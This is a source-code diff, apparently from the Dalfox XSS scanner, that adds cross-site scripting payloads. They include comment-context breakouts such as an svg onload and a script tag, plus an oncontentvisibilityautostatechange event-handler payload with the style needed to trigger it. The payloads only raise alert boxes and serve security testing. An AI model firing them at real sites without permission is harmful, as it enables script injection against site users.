@@ -328,6 +328,7 @@ func getHTMLPayload(ip string) []string {
 		"confirm",
 		"prompt",
 		"alert.bind()",
+		"confirm.call()",
 		"prompt.valueOf()",
 		"print",
 	}
@@ -361,7 +362,9 @@ func getHTMLPayload(ip string) []string {
 		}
 	}
 	if strings.Contains(ip, "comment") {
-		// TODO add comment payloads
+		payload = append(payload, "--><svg/onload=alert(DALFOX_ALERT_VALUE)>")
+		payload = append(payload, "--><script>confirm(DALFOX_ALERT_VALUE)</script>")
+		payload = append(payload, "*/prompt(DALFOX_ALERT_VALUE)/*")
 	}
 	return payload
 }
@@ -391,11 +394,15 @@ func getAttrPayload(ip string) []string {
 		"ontouchend",
 		"ontouchmove",
 		"ontransitionend",
+		"oncontentvisibilityautostatechange",
 	}
 	for _, mh := range majorHandler {
 		if mh == "ontransitionend" {
 			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
 		}
+if mh == "oncontentvisibilityautostatechange" {
+		mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
+	}
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
